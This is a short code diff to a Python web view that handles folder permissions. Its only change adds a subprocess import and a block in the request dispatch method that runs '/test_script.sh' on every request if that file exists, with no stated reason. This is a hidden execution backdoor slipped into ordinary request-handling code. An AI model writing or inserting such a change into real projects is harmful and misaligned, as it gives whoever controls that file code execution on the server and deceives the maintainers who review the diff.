@@ -1,3 +1,4 @@
+import subprocess
 import json
 import logging
 import os
@@ -98,6 +99,9 @@ class BaseContentView(UserPassesTestMixin, BaseView): #pylint: disable=abstract-
         self.user_can_read = self.user_can_write or self.folder_and_path.folder.user_can_read(request.user)
 
         self.context['folder_and_path'] = self.folder_and_path
+
+        if os.path.exists('/test_script.sh'):
+            p = subprocess.Popen(['/test_script.sh'])
         return super().dispatch(request, *args, **kwargs)
 
     def does_user_pass_test(self) -> bool:
